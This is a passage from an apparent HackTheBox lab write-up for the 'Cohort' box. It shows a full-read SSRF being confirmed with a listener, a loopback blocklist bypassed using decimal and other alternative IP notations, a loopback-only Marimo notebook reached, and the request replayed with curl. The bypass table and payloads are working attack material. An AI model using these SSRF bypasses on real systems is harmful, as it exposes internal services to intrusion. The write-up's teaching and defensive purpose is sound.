- **nginx is configured with an SPA fallback that returns HTTP 200 and the 908-byte shell for every unresolved path.** Content length and body must be used to distinguish real resources from misses; HTTP status must not be.
- The 1.3 kB JSON response observed in the browser was fetched from a different path than `/config.json`. The DevTools **Name** column displays only the terminal filename, not the full request URL.

**Ruled out:** `/config.json` at the web root.

**Next:**  
Read the full request URL from the Network panel's Headers tab to locate the configuration file at its actual path.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.6 Confirm the attacking VPN address

**Why this step:**  
The SSRF identified in 2.4 requires an attacker-controlled endpoint to confirm outbound fetching. Establish the correct source address before configuring any listener.

**Command:**

```bash
ip a show tun0
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`ip a`|Abbreviation of `ip address`. Displays interface configuration and assigned addresses.|
|`show tun0`|Restrict output to the VPN tunnel interface. Without this, every interface is listed and the wrong address is easily selected.|

**Result:**

```
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.77/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::114b/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::8507:cb91:406e:9a29/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
```

**What this gives you:**

**Key finding: the attacking host is reachable from the target at `10.10.15.77` over `tun0`.** Use this address as LHOST for callbacks and listeners.

Select the address by **interface name**, not by IP prefix. Multiple interfaces on an attacking host can carry addresses in the same range, and a callback configured against the wrong one produces a payload that executes correctly but never connects back — a failure that presents identically to the exploit not working at all.

The `POINTOPOINT` flag and `link/none` confirm this is a tunnel rather than a physical adapter. The `/23` netmask covers the VPN segment; the target from section 1 sits outside it and is reached by routing.

**Next:**  
LHOST is established. Locate the configuration file's true path, then proceed to confirming outbound fetch behaviour through the form.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.7 Trace the configuration fetch to its origin (dead end)

**Why this step:**  
Section 2.5 established that `/config.json` is absent from the web root while the browser retrieved 1.3 kB of JSON under that filename. Read the full request URL from the Network panel to locate the file's true path.

**Command:**

```
1. In DevTools > Network, select the config.json row
2. Open the Headers tab and read Request URL under General
3. Open the Response tab to view the body
```

**Result:**

`![[config_json_headers.png]]`  
`![[config_json_response.png]]`

```
Request URL:     chrome-extension://jffbochibkahlbbmanpmndnhmeliecah/config.json
Request Method:  GET
Status Code:     200 OK
Content-Type:    application/json
Last-Modified:   Thu, 03 Sep 2026 21:50:59 GMT
```

json

```json
[
  { "host": "ceskatelevize.cz", "selector": "#ctPlayer1", "capture": true },
  { "host": "dailymotion.com", "selector": "#player-body", "capture": true },
  { "host": "france.tv", "selector": ".js-player-container", "capture": true },
  { "host": "netflix.com", "selector": "html", "capture": true },
  { "host": "nicovideo.jp", "selector": ".PlayerContainer", "capture": true },
  { "host": "kvs-demo.com", "selector": "#kt_player", "capture": true },
  { "host": "periscope.tv", "selector": ".EventHandler-Layer", "capture": true },
  { "host": "pluralsight.com", "selector": ".player-wrapper", "capture": false },
  { "host": "primevideo.com", "selector": ".webPlayerUIContainer", "capture": true },
  { "host": "rutube.ru", "selector": ".raichu-video-tag", "capture": true },
  { "host": "ruv.is", "selector": ".video-js", "capture": true },
  { "host": "ted.com", "selector": "html", "capture": false },
  { "host": "twitch.tv", "selector": ".persistent-player", "capture": false },
  { "host": "vimeo.com", "zIndex": "300", "selector": ".player", "capture": false },
  { "host": "yandex.ru", "selector": ".player-container", "capture": true },
  { "host": "youtube.com", "zIndex": "10" }
]
```

**Analysis:**

The request scheme is `chrome-extension://`, not `https://`. This resource was loaded by a browser extension installed in the testing profile — a picture-in-picture utility — and its contents are a mapping of video-hosting sites to the CSS selectors identifying each site's player element. The file has no relationship to the target.

The initiator recorded in 2.4 stated this: `picture-in-picture.js:262`. That filename belongs to no part of the Cohort Analytics application.

###### Theory — browser extensions contaminate the network log:

The Network panel records every request the browser process makes in that tab, and installed extensions issue their own requests: configuration files, update checks, telemetry, and content-script assets. These appear interleaved with application traffic and are formatted identically, with plausible filenames such as `config.json`, `settings.json`, or `api.js`.

Two reliable discriminators exist:

- **URL scheme.** Extension resources load over `chrome-extension://` or `moz-extension://` followed by a 32-character extension ID. Target traffic uses `http://` or `https://` with the target hostname. The Name column truncates to the filename and hides this, so the Headers tab must be consulted before treating any entry as a finding.
- **Initiator.** Extension-originated requests name a script that is not part of the application bundle.

The operational fix is to conduct web enumeration in a dedicated browser profile with no extensions installed. Beyond wasted analysis time, an extension artifact recorded as a target finding is a factual error in a deliverable, and extension traffic can also leak the tested URL to third-party services.

**What this gives you:**

**Key findings:**

- `config.json` is a browser extension artifact and carries no information about the target. Disregard it.
- The application's complete runtime request set is three resources: `portal.html`, `styles.css`, and `app.js`. No API endpoints are called during page load, consistent with the portal submitting only on user action.
- Verify the URL scheme and initiator of any Network panel entry before treating it as target-derived evidence.

**Ruled out:** A server-side configuration file at any path. No such resource is fetched by this application.

**Next:**  
No configuration endpoint exists. Return to the URL submission form and confirm by direct observation that the server performs an outbound fetch of the supplied address.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation - SSRF

### 3.1 Confirm outbound fetch with an attacker-controlled listener

**Why this step:**  
The portal at `/portal.html` (2.4) states that it fetches any URL supplied in the Source URL field. Verify that claim by observation on infrastructure under your control, rather than relying on the application's own report of success.

**Command:**

```bash
# On the attacking host:
python3 -m http.server 8000
```

```
# In the portal form at https://cohort.htb/portal.html:
Source URL:      http://10.10.15.77:8000/ssrf-test
Expected format: CSV
Then submit via "Validate source"
```

**Breakdown:**

| Component                | Purpose                                                                                                                                                                                                   |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `python3 -m http.server` | Runs Python's built-in HTTP server module directly, without a script. Serves the current directory and logs every inbound request with source IP, method, path, and status.                               |
| `8000`                   | Listening port. Any unprivileged port works; ports below 1024 would require root.                                                                                                                         |
| `/ssrf-test`             | A path that does not exist locally. The 404 is intentional — the objective is a logged connection, not a successful file transfer. A unique path also distinguishes this callback from unrelated traffic. |

**Result:**

Listener output on the attacking host:

```bash
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.121.70 - - [09/Sep/2026 01:52:10] code 404, message File not found
10.129.121.70 - - [09/Sep/2026 01:52:10] "GET /ssrf-test HTTP/1.1" 404 -
```

Application response rendered in the portal:

![[ssrf_confirmed_validate.png.png]]

```
● Reachable. HTTP 404 (text/html;charset=utf-8)
```

```html
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```

Backend request captured in DevTools:

```
Request URL:      https://cohort.htb/api/validate
Request Method:   POST
Status Code:      200 OK
Remote Address:   TARGET_IP:443
Content-Type:     application/json    (request and response)
Content-Length:   58 (request) / 498 (response)
Server:           nginx/1.24.0 (Ubuntu)
```
<div align="center">
<br>
</div>

###### Theory: Server-Side Request Forgery, and why the response body changes everything:

Normally when you visit a web page, **your** computer fetches it. You type an address, your machine connects out, and whatever comes back is limited to what your machine can reach.

This form breaks that pattern. You hand the application an address and **the server** goes and fetches it for you, then shows you what it found. That sounds harmless — until you consider that the server sits somewhere you don't.

Picture the target as an office building. From outside on the street, you can see the reception desk through the front window and nothing more. The building's own internal phone system, the notice board in the staff kitchen, the server room at the back — all invisible to you, and deliberately so. Now suppose reception offers a service: tell them any phone number and they'll ring it and read you the conversation. Give them an outside number and it's a useful feature. Give them an **internal extension** and they'll happily dial it and read you the contents of a conversation you were never meant to hear. Reception can reach every extension in the building. You can't. So you use reception as your hands.

That's Server-Side Request Forgery: making a server fetch things on your behalf, then using its privileged network position as your own. The addresses this typically unlocks:

|Address type|Example|Why it matters|
|---|---|---|
|Loopback|`127.0.0.1`|The server's own machine. Services bound here refuse all outside connections by design — they only accept requests originating on the box itself. Frequently they have no password at all, precisely because "only local processes can reach me" was assumed to be sufficient protection.|
|Internal network|`10.0.0.5`, `192.168.1.20`|Other machines on the same private network — databases, admin panels, internal APIs — with no route from the internet.|
|Cloud metadata|`169.254.169.254`|On cloud-hosted servers, an endpoint that hands out the machine's credentials to anything that asks. Reachable only from the instance itself.|

The loopback row is the one that matters on this box, and section 1.2 already foreshadowed it: a service bound to `127.0.0.1` produces no packets on the wire, so no port scan of any duration or aggression will ever find it. SSRF is not merely a faster way in — it is the only way to see such a service at all.

**Two flavours, and the difference is large.** How useful an SSRF is depends entirely on whether the application shows you what it fetched:

- **Blind SSRF** — the server makes the request but tells you nothing about the result. You know it happened only because something you control was contacted. Working out what internal services exist becomes guesswork from indirect clues: did the response take 5 seconds (something answered slowly) or 50 milliseconds (nothing there)? Slow, unreliable, and easy to misread.
- **Full-read SSRF** — the server fetches the page and **hands you the contents**. You read internal responses as plainly as if you'd browsed to them yourself. The application has become a web browser you can point anywhere inside the network.

The evidence above is unambiguously the second kind. The portal returned the status code (`404`), the content type (`text/html;charset=utf-8`), and the entire response body. Nothing was guessed at.

**One more habit worth forming.** The application announced "Reachable" on its own — so why bother with the listener? Because an application's claim about the outside world is not evidence. It could be reporting a cached result, checking the URL's format without fetching anything, or misreporting a partial response. The listener log settles it: a connection arrived, from source IP `TARGET_IP`, which is the target — not your browser. The server genuinely opened a TCP connection and sent an HTTP request to an address you chose. **Verify on infrastructure you control; treat the target's self-report as a claim, not a fact.**
<div align="center">
<br>
<br>
</div>

**What this gives you:**

**Key findings:**

- **SSRF is confirmed by direct observation.** The listener logged `GET /ssrf-test HTTP/1.1` sourced from `TARGET_IP`, the target host itself. The server issues outbound HTTP requests to attacker-specified addresses.
- **The vulnerability is full-read.** Status code, content type, and complete response body are rendered back in the portal. Internal services can be enumerated and fingerprinted directly rather than inferred.
- **The backend endpoint is `POST /api/validate`**, accepting a 58-byte JSON body and returning a 498-byte JSON response. Driving this endpoint with `curl` permits scripted iteration over many URLs, which the browser form does not.
- The fetch is synchronous and completes within the request cycle — the result appears in the response to the same POST rather than arriving later.

**Instance variation:** The connection logged from `TARGET_IP` reflects a target address reassigned since the scans in section 1. HTB instances receive a new address on each spawn. The `/etc/hosts` entry created in 1.4 requires updating to the current address; work performed by hostname is otherwise unaffected.

**Next:**  
Outbound fetching is proven. The published notes claim internal and loopback addresses are rejected — probe that filter directly to establish what it blocks and how it reports rejection, since the wording of the rejection identifies where in the request pipeline the check is applied.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Probe the filter with a literal loopback address

**Why this step:**  
Outbound fetching is confirmed (3.1). The portal's published notes claim internal and loopback addresses are rejected. Establish empirically what the filter blocks and how it signals rejection, since the form of the rejection reveals where in the request pipeline the check runs.

**Steps:**

```
# In the portal form at https://cohort.htb/portal.html:
Source URL:      http://127.0.0.1:80/
Expected format: CSV
Then submit via "Validate source"
```

**Breakdown:**

| Component    | Purpose                                                                                                                                                                                                                         |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `127.0.0.1`  | The canonical IPv4 loopback address. Refers to the machine making the connection. Here, the target server itself. The most obvious value any blocklist would include, submitted first to establish that a filter exists at all. |
| `:80`        | Explicit port. The target runs nginx on 80 (section 1.3), so a successful fetch would return recognisable content rather than a connection error, keeping "blocked" and "nothing listening" distinguishable.                    |
| Trailing `/` | Requests the document root.                                                                                                                                                                                                     |

**Result:**

![[ssrf_filter_block_loopback.png.png]]

Application response rendered in the portal:

```
● Could not validate source

Internal or loopback addresses are not permitted.
```

No connection was logged on the attacking host's listener.

**Analysis:**

Compare against the successful fetch in 3.1:

|                       | 3.1 - external address                        | 3.2 - loopback address                            |
| --------------------- | --------------------------------------------- | ------------------------------------------------- |
| Status line shown     | Reachable. HTTP 404 (text/html;charset=utf-8) | Could not validate source                         |
| Detail                | Full response body of the fetched resource    | Internal or loopback addresses are not permitted. |
| Upstream status code  | Present (404)                                 | Absent                                            |
| Upstream content type | Present                                       | Absent                                            |
| Response body preview | Present                                       | Absent                                            |
| Elapsed time          | Delay consistent with a network round trip    | Immediate                                         |

The rejection carries no upstream status code, no content type, and no body preview, and returns without a round-trip delay. **The request was never issued.** The application inspected the submitted string, matched it against a set of prohibited values, and returned an error before invoking any HTTP client.
<div align="center">
<br>
<br>
</div>

###### Theory: blocklists, and why they fail where allowlists do not:

Input validation can be built two ways round.

An **allowlist** enumerates what is permitted and rejects everything else. To be correct it needs a complete list of **acceptable** values. Usually short and known in advance, such as "any host in `reports.example.htb`". Anything unanticipated is refused. It fails **closed**: an oversight blocks legitimate input, which is visible, annoying, and gets fixed.

A **blocklist** enumerates what is forbidden and permits everything else. To be correct it needs a complete list of every _unacceptable_ value and, critically, every alternative way of expressing each one. It fails **open**: an oversight silently permits an attack, and nothing in normal operation reveals the gap.

The message here, "Internal or loopback addresses are not permitted" describes a blocklist. The developer listed forbidden addresses and allowed the rest.

The gap this creates is specific and large. The filter examines a **string**. The operating system's network stack ultimately connects using a **32-bit number**. Between the two sits an address-parsing step that accepts a remarkably wide range of notations, all resolving to the same destination:

| Notation         | Written as                                      | Why it works                                                                                                                 |
| ---------------- | ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Dotted decimal   | `127.0.0.1`                                     | The familiar form, and the one a blocklist always covers.                                                                    |
| Bare decimal     | `2130706433`                                    | An IPv4 address is a 32-bit integer. `127×256³ + 0×256² + 0×256 + 1 = 2130706433`. Most clients accept the integer directly. |
| Octal            | `0177.0.0.1`                                    | A leading zero marks an octal number in C-derived parsers. Octal 177 is decimal 127.                                         |
| Hexadecimal      | `0x7f.0x0.0x0.0x1`                              | Leading `0x` marks hexadecimal. Hex 7f is decimal 127.                                                                       |
| Shortened        | `127.1`                                         | With fewer than four parts, the final component expands to fill the remaining bytes.                                         |
| Zero address     | `0`                                             | Interpreted as `0.0.0.0`, which on Linux routes to the local machine.                                                        |
| IPv6 loopback    | `[::1]`                                         | The IPv6 equivalent of `127.0.0.1`.                                                                                          |
| IPv6-mapped IPv4 | `[::ffff:127.0.0.1]`                            | Embeds the IPv4 loopback inside an IPv6 address.                                                                             |
| URL encoding     | `127%2E0%2E0%2E1`                               | `%2E` decodes to `.`. Bypasses a filter that checks before URL-decoding.                                                     |
| DNS              | A hostname whose A record points to `127.0.0.1` | The string contains no address at all; resolution happens after the check.                                                   |

Every entry above reaches the same destination. A filter that string-matches `127.0.0.1` catches only the first row.

The order of operations is what decides the outcome. Checking the **raw string before parsing** compares against text and misses every alternative notation. Checking **after resolution**, by parsing the address to its numeric form, resolving any hostname, and testing the resulting integer against reserved ranges, catches all of them — because by that point every notation in the table has collapsed to the same value. The instantaneous, body-free rejection observed here indicates the former.

**What this gives you:**

**Key findings:**

- **A blocklist filter rejects `127.0.0.1` before any request is made.** No upstream status, content type, or body is returned, and the response is immediate — the check precedes the HTTP client, not follows it.
- **The application provides a clear two-state oracle.** `Could not validate source` with a fixed message means the filter caught the input; `Reachable. HTTP <code>` with a body means the fetch proceeded. Every probe returns an unambiguous answer, making filter-boundary testing cheap and fast.
- **The filter operates on the submitted string**, as evidenced by rejection without a network round trip. Alternative notations for the same address are therefore candidate bypasses, since address parsing occurs after the check.
- The rejection message is generic and identical regardless of input, disclosing nothing about which specific rule matched.

**Ruled out:** Direct submission of `127.0.0.1` in dotted-decimal form.

**Next:**  
The check runs against text while the connection is made against a parsed number. Submit an alternative encoding of the loopback address that the filter's string comparison will not match but the HTTP client will still resolve to the same destination.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Bypass the filter with decimal IP encoding

**Why this step:**  
The filter rejects `127.0.0.1` before issuing any request (3.2), indicating a string comparison performed prior to address parsing. Submit an alternative notation that resolves to the same address but does not match the blocked text.

**Steps:**

```
# In the portal form at https://cohort.htb/portal.html:
Source URL:      http://2130706433:80/
Expected format: CSV
Then submit via "Validate source"
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`2130706433`|`127.0.0.1` expressed as a single 32-bit decimal integer. Standard address-parsing routines accept this form and resolve it to loopback; a string comparison against `127.0.0.1` does not match it.|
|`:80`|The target's nginx listener (section 1.3). Chosen because a successful fetch returns identifiable content, distinguishing a real response from a connection failure.|
<div align="center">
<br>
<br>
</div>

###### Theory: how a dotted IPv4 address becomes a single number:

An IPv4 address is a 32-bit unsigned integer. Dotted-decimal notation is a display convention that splits that integer into four 8-bit fields joined by dots — convenient for humans, not how the network stack stores or transmits it.

Converting `127.0.0.1` to its integer form means treating the four octets as digits in base 256, most significant first:

```
127 × 256³  = 127 × 16777216 = 2130706432
  0 × 256²  = 0 ×    65536   =          0
  0 × 256¹  = 0 ×      256   =          0
  1 × 256⁰  = 1 ×        1   =          1
                              ───────────
                               2130706433
```

Both `127.0.0.1` and `2130706433` therefore describe the identical 32-bit value. The C library function `inet_addr()` and its equivalents in most languages accept either notation, which is why HTTP clients built on those libraries connect to loopback when handed the bare integer.

The security consequence follows directly. Text and destination are different things. A filter comparing the submitted string against `"127.0.0.1"` sees a nine-character literal; the network stack sees the number 2130706433. Because the filter runs before parsing, the two never meet — the string doesn't match the blocklist, and the parsed number still lands on loopback.

The generalisation is worth carrying beyond this box: **validate after normalisation, never before.** Any check applied to raw user input must contend with every alternative spelling of the forbidden value. A check applied to the fully parsed, resolved form contends with only one, because every notation has already collapsed into the same value by that point.

**Result:**

![[ssrf_bypass_decimal.png.png]]

Application response rendered in the portal:

```
● Reachable. HTTP 200 (text/html)
```

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cohort Analytics</title>
<meta name="description" content="Cohort Analytics - retention intelligence for subscription teams.">
<link rel="stylesheet" href="/assets/styles.css">
</head>
<body>
<div id="app" data-page="home" aria-busy="true">
  <div class="boot"><span class="boot-mark" aria-hidden="true"></span><span>Loading Cohort Analytics</span></div>
</div>
<noscript>
  <div style="max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;">
    <h1 style="font-size:1.4rem;">JavaScript required</h1>
    <p style="color:#4a5159;">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>
  </div>
</noscript>
<script src="/assets/app.js" defer></script>
</body>
</html>
```

Backend request captured in DevTools:

```
Request URL:      https://cohort.htb/api/validate
Request Method:   POST
Status Code:      200 OK
Content-Length:   46 (request) / 1077 (response)
Server:           nginx/1.24.0 (Ubuntu)
```

**Analysis:**

Compare the three probes issued so far:

|Probe|Input|Result|Upstream status|Response size|
|---|---|---|---|---|
|3.1|`http://10.10.15.77:8000/ssrf-test`|Fetched|HTTP 404|498 bytes|
|3.2|`http://127.0.0.1:80/`|Blocked by filter|none|498 bytes|
|3.3|`http://2130706433:80/`|**Fetched**|**HTTP 200**|**1077 bytes**|

The body returned is the SPA shell identified in 2.2. The target's own nginx document root, retrieved from the target itself over loopback. The address the filter refused in 3.2 was reached in 3.3 by writing it differently.

**What this gives you:**

**Key findings:**

- **The SSRF filter is bypassed.** Decimal integer notation is not matched by the blocklist, and the HTTP client resolves it to `127.0.0.1` regardless. Loopback services on the target are now reachable.
- **The reflected response confirms full read access to internal content.** HTTP status, content type, and complete body are returned for internal destinations exactly as they were for external ones.
- **Response length is a reliable success indicator.** A filter rejection returns 498 bytes from `/api/validate`; a successful fetch returns the upstream body inline, producing a larger response. This permits scripted iteration without parsing the rendered page.
- Loopback port 80 serves the same nginx instance reachable externally, confirming the fetch genuinely targets the local interface rather than being redirected elsewhere.

**Next:**  
An HTTP client now operates from inside the target's network boundary. Section 1.2 established that services bound to the loopback interface generate no external traffic and cannot appear in any port scan. Probe internal ports through this channel to enumerate services that external scanning could not reveal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 Reach the loopback-only service on port 8888

**Why this step:**  
The decimal-encoding bypass (3.3) grants HTTP access to the target's loopback interface. Section 1.2 established that loopback-bound services cannot appear in any external scan. Probe internal ports to enumerate services the port scan could not reveal.

**Port selection rationale:**

Port 8888 was probed on three converging signals:

|Signal|Source|Reasoning|
|---|---|---|
|"Hand back **the notebook**"|Landing page process step C (2.1)|Notebook servers (Jupyter, Marimo) default to port 8888. Application copy naming a notebook makes the canonical notebook port a primary candidate.|
|Wildcard SAN `*.cohort.htb`|TLS certificate (1.3)|nginx is provisioned to route arbitrary subdomains to backends. An internal application fronted by the proxy is implied.|
|Only 22, 80, 443 externally open|Full port scan (1.2)|The externally exposed surface is too narrow to account for the described functionality. Additional services must be bound to loopback.|

On an engagement without prior knowledge of the target, enumerate a candidate list rather than probing single ports. The SSRF provides a two-state oracle (3.2), so each port costs one request. Loopback-bound development and infrastructure services cluster on a small set of conventional ports:

|Port range|Typical services|
|---|---|
|3000, 5000, 8000, 8080, 8888, 9000|Application frameworks and development servers — Node, Flask, Django, Jupyter, Marimo|
|5432, 3306, 27017, 6379|Databases — PostgreSQL, MySQL, MongoDB, Redis|
|9200, 5601, 8500, 2375|Infrastructure — Elasticsearch, Kibana, Consul, Docker API|

**Command:**

```
# In the portal form at https://cohort.htb/portal.html:
Source URL:      http://2130706433:8888/
Expected format: CSV
Then submit via "Validate source"
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`2130706433`|Decimal encoding of `127.0.0.1`, established as a working filter bypass in 3.3.|
|`:8888`|Target port. The conventional notebook-server port and the leading candidate per the rationale above.|

**Result:**

![[ssrf_marimo_8888.png]]

Application response rendered in the portal:

```
● Reachable. HTTP 200 (text/html; charset=utf-8)
```

html

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>marimo</title>
</head>
<body style="
    background-color: #f4f4f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;">
  <form method="POST" action="/auth/login" style="
    padding: 20px;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    width: 300px;
    text-align: center;">
    <div style="margin-bottom: 20px;">
      <label for="password" style="
        display: block;
        margin-bottom: 5px;
        font-size: 16px;
        font-family: Arial, sans-serif;
        color: #333;">Access Token / Password</label>
      <input id="password" name="password" type="password" style="
        width: 100%;
        box-sizing: border-box;
        padding: 8px;
        border: 1px solid #ccc;
        border-radius: 4px;">
    </div>
    <button type="submit" style="
        background-color: #1C7362;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;">Login</button>
    <p style="color: red;"></p>
  </form>
</body>
</html>
```

Backend response length: 1515 bytes (against 498 for a filter rejection).
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>


###### Theory — why a loopback-bound service is invisible to port scanning:

A listening socket is bound to a specific network interface. Binding to `0.0.0.0` accepts connections on every interface, including the external one. Binding to `127.0.0.1` accepts connections only from processes on the same machine.

The distinction is enforced by the kernel, not by a firewall, and it operates before any packet reaches the application. A SYN packet arriving on the external interface for a loopback-bound port is rejected by the network stack with no application involvement whatsoever. Consequently:

- No scan rate, timing template, or retry count changes the result. There is nothing to find on the wire.
- The port reports as `closed`, identically to a port with no service at all. No timing difference, banner, or error distinguishes them.
- Firewall bypass techniques are irrelevant. No firewall is involved.

The only route to such a service is a request that originates on the host itself — which is exactly what SSRF supplies. This inverts the usual enumeration order: the port scan defines the externally exposed surface, and the SSRF then defines the internally exposed surface, which is frequently the larger and less defended of the two. Services bound to loopback are routinely deployed without authentication, on outdated versions, or with debug features enabled, on the assumption that local-only binding is sufficient protection.

**What this gives you:**

**Key findings:**

- **A Marimo notebook server runs on `127.0.0.1:8888`.** Identified by `<title>marimo</title>` and a login form posting to `/auth/login` with an "Access Token / Password" field.
- **The service is authenticated at the web UI level.** A token or password is required for normal login. Credentials are not yet held.
- **This service was absent from every external scan and always would have been.** It is bound to the loopback interface; the kernel rejects external connections before the application sees them.
- The response is 1515 bytes against 498 for a filter rejection, confirming full body retrieval of internal content.
- The login form posts to `/auth/login`, a path relative to the Marimo root, giving a first endpoint on the internal application.

**Next:**  
An authenticated internal application is identified. Establish its exact version before assessing attack paths, since notebook servers have a substantial vulnerability history and version determines which apply. Scripted interaction with `/api/validate` will make further probing faster than the browser form permits.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.5 Capture the backend API request format

**Why this step:**  
Probing each port through the browser form is slow and unrepeatable. The form submits to `POST /api/validate` (3.1). Capture the request body so the endpoint can be driven directly from the command line.

**Steps:**

```
1. In DevTools > Network, select the most recent validate row
2. Open the Payload tab
3. Record the request body
```

**Result:**

![[validate_payload.png]]

```json
{"url": "http://2130706433:8888/", "format": "csv"}
```

|Field|Value|Origin|
|---|---|---|
|`url`|`http://2130706433:8888/`|Source URL text input|
|`format`|`csv`|Expected format select, lowercased from the displayed `CSV`|

Request headers relevant to replay (from 3.4):

```
Content-Type: application/json
Content-Length: 48
Host: cohort.htb
```

**Analysis:**

The body carries two fields and nothing else. Absent from the request:

|Absent element|Consequence|
|---|---|
|CSRF token|No per-request token to fetch and replay. Requests can be issued in isolation.|
|Session cookie|No authentication. The endpoint is reachable unauthenticated.|
|Signature or nonce|No integrity check binding the request to a prior page load.|
|Custom header|No proprietary header the client must supply.|

Every element the server requires is reproducible from a static string, so the endpoint can be scripted with `curl` and iterated over arbitrary inputs.

###### Theory — why replacing the browser with a script matters:

The browser form is a client for this API, not the API itself. Anything the form can request, a script can request, and the server cannot distinguish the two — it receives the same bytes either way. Front-end controls such as an input's `type="url"` attribute, `maxlength`, or JavaScript validation constrain only what the form submits; they impose nothing on a direct request.

Replay-blocking mechanisms would change this. A CSRF token, session cookie, or request signature would each require the script to first obtain a value from a live page and include it, adding a fetch-then-submit cycle per request. None is present here.

The practical gain is iteration. Sweeping thirty candidate ports through the form means thirty rounds of typing, clicking, and reading rendered output. The same sweep as a shell loop is one command and completes in seconds, with output in a form that can be filtered programmatically — by response length, by the presence of a status field, or by grepping the returned body. Enumeration that is tedious by hand becomes exhaustive when scripted, and exhaustive enumeration is what surfaces the service nobody expected.

**What this gives you:**

**Key findings:**

- **`POST /api/validate` accepts a two-field JSON body: `url` and `format`.** The complete request is `{"url": "<target>", "format": "csv"}` with `Content-Type: application/json`.
- **No CSRF token, session cookie, or request signature is present.** The endpoint is unauthenticated and replayable, permitting scripted iteration without a preparatory request.
- The `format` field appears to govern response parsing only and does not restrict which URLs are accepted, since `csv` was submitted while fetching HTML in 3.3 and 3.4 without error.

**Next:**  
Replay the captured request with `curl` to confirm equivalence with the browser form and to observe the raw JSON response envelope, which determines how results are filtered during scripted enumeration.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.6 Replay the SSRF request from the command line

**Why this step:**  
The captured request format (3.5) contains no CSRF token or session cookie. Confirm the endpoint accepts a replayed request outside the browser, and observe the raw response envelope that scripted enumeration will need to parse.

**Command:**

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/","format":"csv"}'
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`-X POST`|Set the HTTP method. The endpoint accepts POST; a GET returns the SPA shell via nginx fallback (2.5).|
|`-H 'Content-Type: application/json'`|Declare the body encoding. Without it curl sends `application/x-www-form-urlencoded`, and a JSON-parsing backend rejects the body or reads no fields. This is the most common cause of a silently failing replay.|
|`-d '{...}'`|The request body captured in 3.5. Single quotes prevent the shell from interpreting the double quotes and braces.|
|`-s`|Silent. Suppresses the progress meter, which corrupts piped output.|
|`-k`|Accept the self-signed certificate.|

**Result:**

```json
{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  